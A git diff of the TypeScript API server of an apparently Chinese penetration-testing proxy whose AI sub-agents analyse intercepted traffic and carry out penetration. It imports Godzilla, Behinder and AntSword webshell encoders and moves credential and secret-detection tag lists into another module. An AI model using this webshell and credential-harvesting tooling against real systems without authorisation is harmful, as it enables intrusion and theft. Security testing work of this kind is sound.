@@ -10,113 +10,32 @@
  * POST /api/proxy/stop      停代理
  * POST /api/proxy/restart   重启代理（换端口用 PUT /api/config）
  */
-import { createServer, type IncomingMessage, type ServerResponse } from 'node:http'
+import { createServer, type IncomingMessage, type Server, type ServerResponse } from 'node:http'
 import crypto from 'node:crypto'
 import { spawn } from 'node:child_process'
-import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs'
+import { existsSync, mkdirSync, readFileSync, writeFileSync, statSync, readdirSync } from 'node:fs'
+import { writeFile } from 'node:fs/promises'
 import { connect } from 'node:net'
 import { SOUL_PERSONA, USER_PROFILE } from './persona.ts'
 import { homedir, tmpdir } from 'node:os'
-import { join } from 'node:path'
+import { basename, dirname, join } from 'node:path'
+import v8 from 'node:v8'
 import WebSocket from 'ws'
 import { decodeBody } from './mitm.ts'
 import { Neo4jGraph } from './graph.ts'
 import os from 'node:os'
-import type { FlowMeta, ProxyEngine, Upstream } from './proxy.ts'
+import type { Downstream, FlowMeta, ProxyEngine, Upstream } from './proxy.ts'
 import type { ChromeBrowser } from './browser.ts'
 import type { FirefoxBrowser } from './firefox.ts'
 import type { SshSession } from './ssh.ts'
 import { AgentBridgeClient } from './bridge.ts'
+import { WebShellClient } from './webshell-client.ts'
+import { normalizeTargetKey, resStatus, extractJson, STATIC_RESOURCE_RE, LOCAL_ARTIFACT_RE, BROWSER_TRAFFIC, isBrowserBuiltin, isPentboxOwnTraffic } from './utils.ts'
+import { HAE_TAGS, HAE_GROUPS, HAE_CRED_TAGS, HAE_LEVEL_COLOR, haeTagList, type HaeGroup } from './tags.ts'
+import { parseVulndoc } from './vulndoc.ts'
 import zlib from 'node:zlib'
 import { godzillaPhpEncode, godzillaPhpEncodeRaw, godzillaPhpDecode, godzillaPhpDecodeFull, godzillaSerializeParams, godzillaSerializeGzip, godzillaJspEncode, godzillaJspEncodeRaw, godzillaJspDecode, godzillaJspDecodeRaw, godzillaJspEncodeParams, godzillaCshapEncode, godzillaCshapEncodeRaw, godzillaCshapDecode, godzillaCshapDecodeRaw, behinderAesEncode, behinderAesDecode, behinderXorEncode, behinderXorDecode, antSwordPhpEncode, xorCrypt } from './webshell.ts'
 
-// ---------------- HaENet 标签体系（5 组分类 + fixed level + 颜色；Agent 敏感提取按此输出 type，前端按此着色） ----------------
-export type HaeGroup = 'Fingerprint' | 'Maybe Vulnerability' | 'Basic Information' | 'Sensitive Information' | 'Other'
-export interface HaeTag { group: HaeGroup; cn: string; level: 'high' | 'medium' | 'low' | 'info'; color: string }
-/** 标签注册表：type 名（LLM 输出）→ 分组/中文名/固定等级/颜色 */
-export const HAE_TAGS: Record<string, HaeTag> = {
-  // ---- Fingerprint（指纹识别，HaENet 原版） ----
-  'Shiro': { group: 'Fingerprint', cn: 'Shiro 框架指纹', level: 'medium', color: '#66bb6a' },
-  'JSON Web Token': { group: 'Fingerprint', cn: 'JWT 令牌指纹', level: 'medium', color: '#4fc3f7' },
-  'Swagger UI': { group: 'Fingerprint', cn: 'Swagger 接口文档', level: 'medium', color: '#f76b6b' },
-  'Ueditor': { group: 'Fingerprint', cn: 'Ueditor 编辑器指纹', level: 'medium', color: '#66bb6a' },
-  'Druid': { group: 'Fingerprint', cn: 'Druid 监控面板', level: 'medium', color: '#f7a35c' },
-  'PDF.js Viewer': { group: 'Fingerprint', cn: 'PDF.js 查看器', level: 'low', color: '#66bb6a' },
-  'Vite DevMode': { group: 'Fingerprint', cn: 'Vite 开发模式', level: 'high', color: '#f76b6b' },
-  // ---- Maybe Vulnerability（潜在漏洞线索，HaENet 原版） ----
-  'Java Deserialization': { group: 'Maybe Vulnerability', cn: 'Java 反序列化入口', level: 'high', color: '#f7e05c' },
-  'Debug Logic Parameters': { group: 'Maybe Vulnerability', cn: '调试/后门参数', level: 'medium', color: '#80cbc4' },
-  'URL As A Value': { group: 'Maybe Vulnerability', cn: 'URL 作为参数值(SSRF)', level: 'medium', color: '#80cbc4' },
-  'Upload Form': { group: 'Maybe Vulnerability', cn: '文件上传表单', level: 'medium', color: '#f7e05c' },
-  'DoS Parameters': { group: 'Maybe Vulnerability', cn: 'DoS 类分页参数', level: 'low', color: '#80cbc4' },
-  'Passwd File': { group: 'Maybe Vulnerability', cn: '口令文件泄漏', level: 'high', color: '#f76b6b' },
-  'Win.ini File': { group: 'Maybe Vulnerability', cn: 'Windows 配置文件泄漏', level: 'high', color: '#f76b6b' },
-  // ---- Basic Information（基础信息，HaENet 原版） ----
-  'Email': { group: 'Basic Information', cn: '邮箱地址', level: 'low', color: '#ce93d8' },
-  'Chinese IDCard': { group: 'Basic Information', cn: '中国大陆身份证', level: 'high', color: '#ffb74d' },
-  'Chinese Mobile Number': { group: 'Basic Information', cn: '中国大陆手机号', level: 'medium', color: '#80cbc4' },
-  'Internal IP Address': { group: 'Basic Information', cn: '内网 IP 地址', level: 'medium', color: '#80cbc4' },
-  'MAC Address': { group: 'Basic Information', cn: 'MAC 地址', level: 'low', color: '#66bb6a' },
-  // ---- Sensitive Information（敏感信息，HaENet 原版 + 兼容原凭据标签） ----
-  'Cloud Key': { group: 'Sensitive Information', cn: '云厂商 AccessKey', level: 'high', color: '#f7e05c' },
-  'Cloud Access Key': { group: 'Sensitive Information', cn: '云 AccessKey/Secret', level: 'high', color: '#f7e05c' },
-  'Windows File/Dir Path': { group: 'Sensitive Information', cn: 'Windows 路径泄漏', level: 'medium', color: '#66bb6a' },
-  'Password Field': { group: 'Sensitive Information', cn: '密码字段', level: 'high', color: '#f7a35c' },
-  'Username Field': { group: 'Sensitive Information', cn: '用户名/账号字段', level: 'low', color: '#66bb6a' },
-  'WeCom Key': { group: 'Sensitive Information', cn: '企业微信凭证', level: 'high', color: '#66bb6a' },
-  'JDBC Connection': { group: 'Sensitive Information', cn: 'JDBC 数据库连接(明文口令)', level: 'high', color: '#f7e05c' },
-  'Authorization Header': { group: 'Sensitive Information', cn: 'Authorization 认证头', level: 'high', color: '#4fc3f7' },
-  'Sensitive Field': { group: 'Sensitive Information', cn: '敏感字段(key/secret/token)', level: 'medium', color: '#f7e05c' },
-  'Mobile Number Field': { group: 'Sensitive Information', cn: '手机号字段', level: 'low', color: '#66bb6a' },
-  'Userinfo In Link': { group: 'Sensitive Information', cn: 'URL 内嵌用户信息', level: 'medium', color: '#66bb6a' },
-  'User Identity': { group: 'Sensitive Information', cn: '前端身份存储(localStorage)', level: 'medium', color: '#66bb6a' },
-  // ---- 兼容原攻击凭据标签（归入 Sensitive Information 高等级） ----
-  'API Key': { group: 'Sensitive Information', cn: 'API 密钥', level: 'high', color: '#f76b6b' },
-  'Bearer Token': { group: 'Sensitive Information', cn: 'Bearer 令牌', level: 'high', color: '#4fc3f7' },
-  'Password': { group: 'Sensitive Information', cn: '口令/密码', level: 'high', color: '#f7a35c' },
-  'Secret': { group: 'Sensitive Information', cn: '密钥/机密', level: 'high', color: '#f7e05c' },
-  'Token': { group: 'Sensitive Information', cn: '令牌', level: 'high', color: '#4fc3f7' },
-  'Session Cookie': { group: 'Sensitive Information', cn: '会话 Cookie', level: 'high', color: '#b388ff' },
-  'Private Key': { group: 'Sensitive Information', cn: '私钥', level: 'high', color: '#ef5350' },
-  'Authorization': { group: 'Sensitive Information', cn: '认证凭据', level: 'high', color: '#4fc3f7' },
-  // ---- Other（其他，HaENet 原版） ----
-  'Linkfinder': { group: 'Other', cn: '链接发现', level: 'info', color: '#8b98a8' },
-  'Source Map': { group: 'Other', cn: 'Source Map 源码映射', level: 'low', color: '#f48fb1' },
-  'Create Script': { group: 'Other', cn: '动态创建脚本', level: 'low', color: '#66bb6a' },
-  'URL Schemes': { group: 'Other', cn: '自定义 URL 协议', level: 'low', color: '#f7e05c' },
-  'Router Push': { group: 'Other', cn: '前端路由跳转', level: 'info', color: '#ce93d8' },
-  'All URL': { group: 'Other', cn: '链接引用', level: 'info', color: '#8b98a8' },
-  '302 Location': { group: 'Other', cn: '302 重定向地址', level: 'info', color: '#8b98a8' },
-  'OSKeys': { group: 'Other', cn: '系统标识泄漏', level: 'medium', color: '#8b98a8' },
-  // ---- Nday 线索（保留原体系，归 Maybe Vulnerability 高等级） ----
-  'Nday API': { group: 'Maybe Vulnerability', cn: 'Nday 漏洞 API 路径', level: 'high', color: '#ff5252' },
-  'Nday JS': { group: 'Maybe Vulnerability', cn: 'Nday 可疑 JS 引用', level: 'high', color: '#ff7043' },
-  'Nday 组件': { group: 'Maybe Vulnerability', cn: 'Nday 漏洞组件/版本', level: 'high', color: '#ff5252' },
-}
-/** 5 组中文名（prompt 分组说明用） */
-export const HAE_GROUPS: { key: HaeGroup; cn: string }[] = [
-  { key: 'Fingerprint', cn: '指纹识别' },
-  { key: 'Maybe Vulnerability', cn: '潜在漏洞线索' },
-  { key: 'Basic Information', cn: '基础信息' },
-  { key: 'Sensitive Information', cn: '敏感信息' },
-  { key: 'Other', cn: '其他' },
-]
-/** 凭据类标签（写 Cred 节点 + 自动凭据利用意见卡的判定集合） */
-export const HAE_CRED_TAGS = new Set<string>([
-  'API Key', 'Bearer Token', 'Password', 'Secret', 'Token', 'Session Cookie', 'Private Key', 'Authorization',
-  'Cloud Key', 'Cloud Access Key', 'Password Field', 'WeCom Key', 'JDBC Connection', 'Authorization Header',
-])
-/** HAE 漏洞等级色（与前端 AN_LEVEL_COLOR 同源；入图：Vuln/Api/Analysis 节点颜色标识） */
-export const HAE_LEVEL_COLOR: Record<string, string> = { high: '#f76b6b', medium: '#f7a35c', low: '#f7e05c', info: '#8b98a8' }
-/** 渲染 HaENet 标签清单文本（注入分析 prompt） */
-export function haeTagList(): string {
-  const lines: string[] = []
-  for (const g of HAE_GROUPS) {
-    const tags = Object.entries(HAE_TAGS).filter(([, t]) => t.group === g.key)
-    lines.push(`${g.cn}(${g.key})：${tags.map(([k]) => k).join(' / ')}`)
-  }
-  return lines.join('\n')
-}
 
 /** 漏洞记录（Agent CRUD + UI 展示） */
 export interface Vuln {
@@ -189,6 +108,8 @@ export class ApiServer {
   private readonly port: number
   private readonly host: string
   private readonly opts: ApiServerOptions
+  /** 并行分析子 Agent 槽位数（10 槽独立会话；声明在实例字段之前，供 analyzeSlots 等初始化引用） */
+  private static readonly MAX_PARALLEL = 10
 
   constructor(
     private engine: ProxyEngine,
@@ -199,6 +120,7 @@ export class ApiServer {
     this.port = opts.port
     this.host = opts.host ?? '127.0.0.1'
     this.cap = opts.flowCap ?? 5000
+    this.wsClient = new WebShellClient(this.engine)
   }
 
   async start(): Promise<void> {
@@ -206,9 +128,10 @@ export class ApiServer {
     this.graph.connect()
     this.probeHermes()
     setInterval(() => this.probeHermes(), 5000)  // HERMES AGENT 状态实时探测
-    this.loadVulns()
-    this.loadWebshells()
-    this.loadDownstream()
+    this.graph.setProject(this.projectKeyOf())  // Neo4j 图按项目域隔离（默认项目 → default）
+    this.graph.migrateLegacyNodes().catch((e) => console.error('[pentbox] 旧图数据迁移失败:', String(e).slice(0, 120)))
+    this.loadSession()  // 类 Burp 项目恢复：默认项目文件存在则自动加载上次会话（含流量/漏洞/WebShell/配置）
+    this.sessionTimer = setInterval(() => this.queueSessionSave(), ApiServer.SESSION_AUTOSAVE_MS)  // Burp auto-save：定时异步快照
     void this.ensureHermesProfile()  // 自动确保 hermespentbox 独立档案（含 persona/用户画像）
     setTimeout(() => this.ensureSkills(), 3000)  // 档案就绪后确保内置红队技能库（102 技能）
     this.startAnalyzeLoop()
@@ -222,6 +145,9 @@ export class ApiServer {
   }
 
   async stop(): Promise<void> {
+    if (this.sessionTimer) clearInterval(this.sessionTimer)
+    if (this.sessionFlushTimer) clearTimeout(this.sessionFlushTimer)
+    this.saveSession()  // 退出兜底同步保存（保证落盘）
     for (const c of this.sseClients) c.end()
     this.sseClients.clear()
     await new Promise<void>((resolve) => this.server?.close(() => resolve()))
@@ -233,7 +159,7 @@ export class ApiServer {
     if (f.detail) {
       this.flowDetails.set(f.id, f.detail)
       if (this.flowDetails.size > 200) {
-        const first = this.flowDetails.keys().next().value
+        const first = this.flowDetails.keys().next().value as number
         this.flowDetails.delete(first)
       }
       const { detail, ...meta } = f
@@ -284,8 +210,10 @@ export class ApiServer {
   private penetratingKeys = new Set<string>()
   /** 进行中渗透的目标（slot → "Host+路径 方式"，供取消时写入全局情报） */
   private penetrateTargets = new Map<number, string>()
-  /** 已提出渗透意见卡、等待用户决策的子 Agent 槽位（暂停该槽流量分析；用户点渗透/取消/卡片关闭后恢复） */
-  private pendingAdviceSlots = new Set<number>()
+  /** 已提出渗透意见卡、等待用户决策的子 Agent 槽位（暂停该槽流量分析；用户点渗透/取消/卡片关闭后恢复；超时未决策自动恢复防全队停摆）→ slot: 发卡时间戳 */
+  private pendingAdviceSlots = new Map<number, number>()
+  /** 意见卡等待决策超时：用户长时间未决策（未点渗透/未取消/未关卡片）时自动恢复该槽流量分析，防 10 槽全部被卡片暂停导致分析停摆 */
+  private static readonly ADVICE_TIMEOUT_MS = 5 * 60 * 1000
   /** 本地 hermes gateway 进程（渗透经 gateway 执行：取消走 WebSocket abort 信号，参考 hermes-studio chat-run 实现） */
   private gatewayProc: ReturnType<typeof spawn> | null = null
 
@@ -299,40 +227,72 @@ export class ApiServer {
   /** bridge 客户端 */
   private bridge = new AgentBridgeClient({ host: '127.0.0.1', port: this.bridgePort })
 
-  /** 确保本地 Agent Bridge broker 运行（hermes-studio 的 hermes_bridge.py；TCP line-protocol，独立端口）
-   * bridge 未启动时 spawn python hermes_bridge.py；就绪后 bridge 可调 action:chat/steer/get_output */
+  /** 清理上次实例崩溃残留的 bridge 进程（按命令行匹配 pentbox_bridge 的 python，避免复用异常状态） */
+  private killStaleBridge(): void {
+    try {
+      const { execSync } = require('node:child_process') as typeof import('node:child_process')
+      execSync(`powershell -NoProfile -Command "Get-CimInstance Win32_Process -Filter \\"Name='python.exe'\\" | Where-Object { $_.CommandLine -match 'pentbox_bridge' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"`, { timeout: 8000, stdio: 'ignore', windowsHide: true })
+      console.warn('[pentbox] 已清理残留 Agent Bridge 进程')
+    } catch (e) { console.warn('[pentbox] 残留 bridge 清理失败:', String(e).slice(0, 100)) }
+  }
+
+  /** spawn Agent Bridge broker 并登记到进程注册表（退出时统一清理） */
+  private spawnBridge(): boolean {
+    // 用 hermes-agent 的 venv python 启动本应用自带的 Agent Bridge（core/pentbox_bridge.py）
+    const py = join(homedir(), 'AppData', 'Local', 'hermes', 'hermes-agent', 'venv', 'Scripts', 'python.exe')
+    // 优先环境变量指定，否则用应用自带脚本（部署/开发目录）
+    const candidates = [
+      process.env.PENTBOX_BRIDGE_SCRIPT,
+      join(process.cwd(), 'core', 'pentbox_bridge.py'),
+      join(__dirname, '..', 'core', 'pentbox_bridge.py'),
+    ]
+    const found = candidates.find((p) => p && existsSync(p))
+    if (!found) { console.warn('[pentbox] pentbox_bridge.py 未找到，steer/对话桥接不可用'); return false }
+    console.log('[pentbox] 启动 Agent Bridge broker…', found)
+    this.bridgeProc = spawn(py, [found, '--port', String(this.bridgePort), '--hermes-home', this.hermesHome], {
+      env: { ...process.env, HERMES_HOME: this.hermesHome, HERMES_AGENT_ROOT: join(homedir(), 'AppData', 'Local', 'hermes', 'hermes-agent'), PENTBOX_BRIDGE_LOG: join(process.cwd(), 'core', 'pentbox_bridge.log') }, cwd: this.agentCwd, detached: true, stdio: 'ignore', windowsHide: true,
+    })
+    this.bridgeProc.on('exit', () => { this.bridgeProc = null; this.bridgeReady = false })
+    this.bridgeProc.unref()
+    return true
+  }
+
+  /** 端口可达但非本实例 spawn → 视为上次崩溃残留：清理重建（保证 bridge 始终自管，杜绝复用异常状态） */
+  private rebuildStaleBridge(): void {
+    if (this.bridgeProc || this.bridgeReady) return
+    console.warn('[pentbox] 检测到残留 Agent Bridge（非本实例 spawn），清理重建…')
+    this.killStaleBridge()
+    if (!this.spawnBridge()) return
+    const t0 = Date.now()
+    const iv = setInterval(() => {
+      this.bridge.ping()
+        .then(() => { clearInterval(iv); this.bridgeReady = true; console.log('[pentbox] Agent Bridge 重建就绪') })
+        .catch(() => { if (Date.now() - t0 > 25000) { clearInterval(iv); console.warn('[pentbox] Agent Bridge 重建超时') } })
+    }, 1000)
+  }
+
+  /** 确保本地 Agent Bridge broker 运行（本应用自带的 pentbox_bridge.py；TCP line-protocol，独立端口）
+   * 启动时若端口被非本实例的残留 bridge 占用（上次崩溃遗留）→ 清理后重建，避免复用异常状态 */
   private ensureBridge(): Promise<void> {
     if (this.bridgeReady) return Promise.resolve()
     return new Promise((resolve) => {
+      const waitReady = (t0: number) => {
+        const iv = setInterval(() => {
+          this.bridge.ping()
+            .then(() => { clearInterval(iv); this.bridgeReady = true; resolve() })
+            .catch(() => { if (Date.now() - t0 > 25000) { clearInterval(iv); console.warn('[pentbox] Agent Bridge 启动超时'); resolve() } })
+        }, 1000)
+      }
       const probe = () => {
         this.bridge.ping()
-          .then(() => { this.bridgeReady = true; resolve() })
+          .then(() => {
+            if (this.bridgeProc) { this.bridgeReady = true; resolve(); return }  // 本实例 spawn 的，健康
+            this.rebuildStaleBridge()  // 残留 bridge：清理重建
+            resolve()
+          })
           .catch(() => {
-            if (!this.bridgeProc) {
-              // 用 hermes-agent 的 venv python 启动本应用自带的 Agent Bridge（core/pentbox_bridge.py）
-              const py = join(homedir(), 'AppData', 'Local', 'hermes', 'hermes-agent', 'venv', 'Scripts', 'python.exe')
-              // 优先环境变量指定，否则用应用自带脚本（部署/开发目录）
-              const candidates = [
-                process.env.PENTBOX_BRIDGE_SCRIPT,
-                join(process.cwd(), 'core', 'pentbox_bridge.py'),
-                join(__dirname, '..', 'core', 'pentbox_bridge.py'),
-              ]
-              const found = candidates.find((p) => p && existsSync(p))
-              if (!found) { console.warn('[pentbox] pentbox_bridge.py 未找到，steer/对话桥接不可用'); resolve(); return }
-              console.log('[pentbox] 启动 Agent Bridge broker…', found)
-              this.bridgeProc = spawn(py, [found, '--port', String(this.bridgePort), '--hermes-home', this.hermesHome], {
-                env: { ...process.env, HERMES_HOME: this.hermesHome, HERMES_AGENT_ROOT: join(homedir(), 'AppData', 'Local', 'hermes', 'hermes-agent'), PENTBOX_BRIDGE_LOG: join(process.cwd(), 'core', 'pentbox_bridge.log') }, cwd: this.agentCwd, detached: true, stdio: 'ignore', windowsHide: true,
-              })
-              this.bridgeProc.on('exit', () => { this.bridgeProc = null; this.bridgeReady = false })
-              this.bridgeProc.unref()
-            }
-            // 轮询直到可连（broker 启动约 2-5s）
-            const t0 = Date.now()
-            const iv = setInterval(() => {
-              this.bridge.ping()
-                .then(() => { clearInterval(iv); this.bridgeReady = true; resolve() })
-                .catch(() => { if (Date.now() - t0 > 25000) { clearInterval(iv); console.warn('[pentbox] Agent Bridge 启动超时'); resolve() } })
-            }, 1000)
+            if (!this.bridgeProc) this.spawnBridge()  // 未运行 → 启动
+            waitReady(Date.now())
           })
       }
       probe()
@@ -395,7 +355,7 @@ export class ApiServer {
           // 仅主 Agent 聊天（mainChat）允许回写 chatSessionId——流量分析/渗透的会话不得污染主会话指针
           let sid = sessionId
           if (!sid) {
-            sid = `pentbox-chat-${Date.now()}`
+            sid = `${this.projectSessionPrefix()}-${Date.now()}`  // 会话 id 带项目标识（归属当前项目）
             if (mainChat) this.chatSessionId = sid
           }
           opts.onSid?.(sid)  // 尽早通知会话 id（前端运行中 steer 需要）
@@ -426,12 +386,12 @@ export class ApiServer {
           // 避免分析槽/前端状态永久"分析中"（broker 端还有 240s watchdog 双保险）
           const timer = setTimeout(() => {
             if (!finished) {
-              this.bridge.interrupt(sid, undefined, 'hermespentbox').catch(() => {})
+              this.bridge.interrupt(sid, undefined, 'hermespentbox').catch((e) => console.warn('[pentbox] bridge 中断失败:', String(e).slice(0, 100)))
               finish(new Error(`Agent 响应超时（180s），已自动中断`))
             }
           }, 180_000)
           const finish = (err?: Error) => { if (finished) return; finished = true; clearTimeout(timer); err ? reject(err) : resolve(out) }
-          opts.onAbort?.(() => { this.bridge.interrupt(sid, undefined, 'hermespentbox').catch(() => {}); setTimeout(finish, 1500) })
+          opts.onAbort?.(() => { this.bridge.interrupt(sid, undefined, 'hermespentbox').catch((e) => console.warn('[pentbox] bridge 中断失败:', String(e).slice(0, 100))); setTimeout(finish, 1500) })
           // 轮询 get_output（100ms 间隔）直到 done；delta 增量 + 工具进度转发
           const pump = async () => {
             while (!finished) {
@@ -468,19 +428,19 @@ export class ApiServer {
   private enqueueAnalyze(id: number, detail?: unknown, url?: string): void {
     if (this.analyzeMap.has(id)) return
     // HermesPentBox 自身产生的流量（WebShell / Repeater 等带 x-pentbox-source 标记）：直接跳过 Agent 审计（done + 跳过 icon）
-    if (this.isPentboxOwnTraffic(detail)) {
+    if (isPentboxOwnTraffic(detail)) {
       this.analyzeMap.set(id, { state: 'done', vuln: false, builtin: true, detail, url })
       return
     }
     // 浏览器自带流量（更新/字典/遥测/OCSP）：不送 Agent 直接 done（跳过 icon），不占 Hermes 队列
-    if (this.isBrowserBuiltin(detail, url)) {
+    if (isBrowserBuiltin(detail, url)) {
       this.analyzeMap.set(id, { state: 'done', vuln: false, builtin: true, detail, url })
       return
     }
     // 错误状态码：404（资源不存在）与 5xx（服务器错误）无 bypass 价值 → 跳过 Agent（done + 跳过 icon）
     // 401/403/407 等 40x 保留（可做 bypass 分析，必须发 Agent）
     // st===0（连接失败/无响应报文，如 CONNECT 隧道、代理 502 错误）：无响应内容可分析 → 同样跳过
-    const st = this.resStatus(detail)
+    const st = resStatus(detail)
     if (st === 0 || st === 404 || st >= 500) {
       this.analyzeMap.set(id, { state: 'done', vuln: false, skipped: true, detail })
       return
@@ -502,7 +462,9 @@ export class ApiServer {
     this.analyzeMap.set(id, { state: 'queued', detail, url })
     this.analyzeQueue.push(id)
     // 站点地图同步到 Neo4j：进入审计的流量（非 builtin/self/404/5xx/渗透）≡ 站点地图可见项 → 写 Host-Api 节点（图上下文供 Agent 直接看到站点地图）
-    if (url && !this.graphApiSynced?.has(url)) {
+    // 去重 key 含项目域：切换项目后同 URL 需重新同步到新项目域
+    const syncKey = `${this.graph.projectKey}|${url}`
+    if (url && !this.graphApiSynced?.has(syncKey)) {
       const d = detail as { reqLine?: string } | undefined
       const line = String(d?.reqLine || '')
       const m = line.match(/^(\S+)\s+(\S+)/)
@@ -516,98 +478,33 @@ export class ApiServer {
       this.graph.upsertHostApi(host, path, method)
         .then(() => {
           if (this.graphApiSynced.size > 5000) this.graphApiSynced.clear()  // 防无限增长（重启即清，Neo4j 侧 MERGE 幂等）
-          this.graphApiSynced.add(url)
+          this.graphApiSynced.add(syncKey)
         })
         .catch(() => { /* 图写入失败：不标记，下次同 URL 流量再试 */ })
     }
   }
 
-  /** 从报文快照解析响应状态码（resLine 形如 HTTP/1.1 404 Not Found） */
-  private resStatus(detail?: unknown): number {
-    const d = detail as { resLine?: string } | undefined
-    const m = String(d?.resLine ?? '').match(/HTTP\/[\d.]+\s+(\d{3})/)
-    return m ? Number(m[1]) : 0
-  }
-
-  /** 浏览器内置流量特征：Chrome/Edge/Firefox 更新、字典、时间同步、遥测、OCSP 证书状态等（旧实例日志实证样本） */
-  private static readonly BROWSER_TRAFFIC = [
-    /redirector\.gvt1\.com/,            // Chrome 字典/组件下载
-    /edgedl\/chrome\/dict/,             // Chrome 拼写字典
-    /clients\d*\.google\.com/,          // Chrome 时间同步/遥测
-    /update\.googleapis\.com/,          // Chrome 更新服务
-    /service\/update2\/json/,           // Chrome 更新轮询
-    /\/time\/1\/current/,               // Google 时间同步
-    /tools\.google\.com\/service\/update/, // 更新清单
-    /safebrowsing\.googleapis\.com/,    // 安全浏览
-    /accounts\.google\.com\/ListAccounts/,  // Chrome 账户轮询
-    /content-autofill\.googleapis\.com/,    // Chrome 自动填充
-    /connectivitycheck\.gstatic\.com/,  // 网络连通性探测
-    /\/generate_204\//,                 // 连通性 204 探针
-    /clientservices\.google\.com/,      // Chrome 遥测
-    /accounts\.google\.com\/domainreliability/,  // 账户域可靠性上传
-    /www\.google\.com\/async\//,                 // 首页异步功能（folae 等）
-    /www\.google\.com\/complete\/search/,        // 地址栏自动补全（omnibox suggestions：client=chrome-omni 等）
-    /ohttp_gateway/,                             // gstatic OHTTP 网关（隐私代理）
-    /gvt1-cn\.com/,                              // 字典 CDN 镜像（sn-*.gvt1-cn.com）
-    /update\.googleapis\.com/,                   // Chrome 组件更新服务
-    /www\.googleapis\.com/,                      // Google API 遥测（chromewebstore verify 等）
-    /chromewebstore\.googleapis\.com/,           // 扩展商店
-    /android\.clients\.google\.com/,             // Chrome checkin
-    /optimizationguide-pa\.googleapis\.com/,     // 优化指南模型
-    /clientservices\.googleapis\.com/,           // uma 遥测
-    /beacons\.gcp\.gvt2\.com/,                   // 域可靠性上传
-    /ocsp\.(digicert|comodoca|pki\.goog|usertrust|globalsign)\./,  // OCSP 证书吊销检查
-    /crl\.(digicert|comodoca|globalsign)\./,                       // CRL 吊销列表
-    // ---- Firefox/Edge 内置遥测与系统流量（旧实例日志实证样本） ----
-    /\.services\.mozilla\.com\//,                // Firefox 设置同步/地理位置/追踪保护列表（firefox.settings/location/shavar.*）
-    /\.cdn\.mozilla\.net\//,                     // Firefox 设置附件/内容签名/远程配置 CDN
-    /detectportal\.firefox\.com/,                // Firefox 网络连通性探测（captive portal）
-    /firefox-settings\.mozilla-backup\.org/,     // Firefox 设置备份域
-    /mozilla-ohttp\.fastly-edge\.com/,           // Firefox OHTTP 隐私网关
-    /aus5\.mozilla\.org/,                        // Firefox 更新服务器
-    /normandy\.(cdn\.)?mozilla\.(org|net)/,      // Firefox Normandy 实验/特性开关
-    /snippets\.cdn\.mozilla\.net/,               // Firefox 新标签页摘要
-    /accounts\.firefox\.com/,                    // Firefox 账户同步
-    /shavar\.services\.mozilla\.com/,            // Firefox 跟踪保护列表（Safe Browsing 分流）
-    /incoming\.telemetry\.mozilla\.org/,         // Firefox 遥测上报
-    /firefox\.cloud\.mozilla\.com/,              // Firefox 云
-  ]
-
-  /** 本机工件/客户端请求头噪音特征：分析出的"敏感项"命中则视为非目标泄漏（脏情报不入图） */
-  private static readonly LOCAL_ARTIFACT_RE = /(C:\\Users\\[^\\"'\s]+|\/Users\/[^\/"'\s]+|windows\/system32|localhost(?::\d+)?|127\.0\.0\.1|Proxy-Connection|Accept-Encoding|Accept-Language|Upgrade-Insecure-Requests|^Sec-Fetch-|Connection\s*:\s*keep-alive|User-Agent\s*:\s*curl)/i
-
-  private isBrowserBuiltin(detail?: unknown, url?: string): boolean {
-    const s = (typeof detail === 'string' ? detail : JSON.stringify(detail ?? '')) + ' ' + (url ?? '')  // url 参与匹配（detail 无路径时黑名单 URL 规则仍命中）
-    if (!s.trim()) return false
-    return ApiServer.BROWSER_TRAFFIC.some((re) => re.test(s))
-  }
-
-  /** HermesPentBox 自身流量（WebShell 命令执行 / Repeater 等）：请求带 x-pentbox-source 标记头 → 跳过 Agent 审计 */
-  private isPentboxOwnTraffic(detail?: unknown): boolean {
-    const reqHeaders = (detail as { reqHeaders?: Record<string, string> })?.reqHeaders
-    if (reqHeaders) {
-      const src = String(reqHeaders['x-pentbox-source'] || '').toLowerCase()
-      if (src === 'webshell' || src === 'repeater') return true
-    }
-    const s = typeof detail === 'string' ? detail : JSON.stringify(detail ?? '')
-    return /x-pentbox-source[":]?\s*["']?(webshell|repeater)/i.test(s)
-  }
+  // （resStatus / BROWSER_TRAFFIC / LOCAL_ARTIFACT_RE / STATIC_RESOURCE_RE / isBrowserBuiltin / isPentboxOwnTraffic / extractJson / normalizeTargetKey 已提取至 core/utils.ts）
 
   // ---------------- 本地 Hermes 分析器（CLI 子进程；独立档案 HermesPentBox + 10 槽会话负载均衡） ----------------
   private hermesCli = join(homedir(), 'AppData', 'Local', 'hermes', 'hermes-agent', 'venv', 'Scripts', 'hermes.exe')
   /** HermesPentBox 独立档案目录（SOUL.md 猎隼 persona + memories/user.md 用户画像；所有会话落此档案） */
   private hermesHome = join(homedir(), 'AppData', 'Local', 'hermes', 'profiles', 'hermespentbox')
-  /** spawn 时注入 HERMES_HOME → 分析/对话会话都在 HermesPentBox 档案之下；HTTP(S)_PROXY 指向本应用代理（子 Agent 渗透流量必须经过应用），NO_PROXY 排除模型 API 域名（模型调用直连不走代理）；TMPDIR/TEMP/TMP + cwd 指向系统临时目录（Agent 所有临时文件落临时目录，不污染工作目录） */
-  private hermesEnv = {
-    ...process.env,
-    HERMES_HOME: join(homedir(), 'AppData', 'Local', 'hermes', 'profiles', 'hermespentbox'),
-    HTTP_PROXY: 'http://127.0.0.1:8899',
-    HTTPS_PROXY: 'http://127.0.0.1:8899',
-    NO_PROXY: 'api.minimaxi.com,api.deepseek.com,localhost',
-    no_proxy: 'api.minimaxi.com,api.deepseek.com,localhost',
-    TMPDIR: tmpdir(),
-    TEMP: tmpdir(),
-    TMP: tmpdir(),
+  /** spawn 时注入 HERMES_HOME → 分析/对话会话都在 HermesPentBox 档案之下；HTTP(S)_PROXY 指向本应用代理（子 Agent 渗透流量必须经过应用——动态跟随监听 IP：自定义 IP 时用该 IP，0.0.0.0 用 127.0.0.1 回环，否则代理只绑自定义 IP 时回环连不上、渗透流量丢失），NO_PROXY 排除模型 API 域名（模型调用直连不走代理）；TMPDIR/TEMP/TMP + cwd 指向系统临时目录（Agent 所有临时文件落临时目录，不污染工作目录） */
+  private get hermesEnv(): NodeJS.ProcessEnv {
+    const ip = this.host && this.host !== '0.0.0.0' ? this.host : '127.0.0.1'
+    const proxyPort = this.opts.proxyPort ?? 8899
+    return {
+      ...process.env,
+      HERMES_HOME: join(homedir(), 'AppData', 'Local', 'hermes', 'profiles', 'hermespentbox'),
